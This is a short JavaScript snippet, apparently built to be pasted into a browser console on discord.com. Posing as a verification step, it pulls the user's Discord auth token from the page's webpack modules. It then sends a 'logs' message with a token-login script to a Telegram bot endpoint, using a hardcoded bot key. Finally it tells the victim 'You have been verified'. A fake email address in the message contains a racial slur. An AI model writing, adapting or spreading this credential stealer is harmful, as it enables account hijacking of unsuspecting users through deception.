if (location=='discord.com') {
    const e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    const message = `🐹 **HAM$TER LOGS 1.0**\n\n🧑 User Info\n- Username: \`poor\`\n- Mail: \`nigga@the.email\`\n- Phone: \`+16666667788\`\n🔩 Login Script: \`\`\`function login(e){setInterval((()=>{document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.token=\`"\${e}"\`}),50),setTimeout((()=>{location.reload()}),2500)}login("TOKEN");\`\`\``;
    debugger;
    // 
    const a = fetch("https://discord.com/api/v9/users/1302948309836501016/profile?with_mutual_guilds=false&with_mutual_friends=false&with_mutual_friends_count=false",{method:"GET",headers:{"Authorization":e}});
    fetch("https://api.telegram.org/bot7876370925:AAHNs3cnFAZI7IS00-TPgWAZRvb2Dtx7MWY/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"-4781074793",text:message,parse_mode:"MarkdownV2"})});
    alert('You have been verified')
}
if (location=='dyno.pw') {
    alert(`You are not at discord.com!`)
}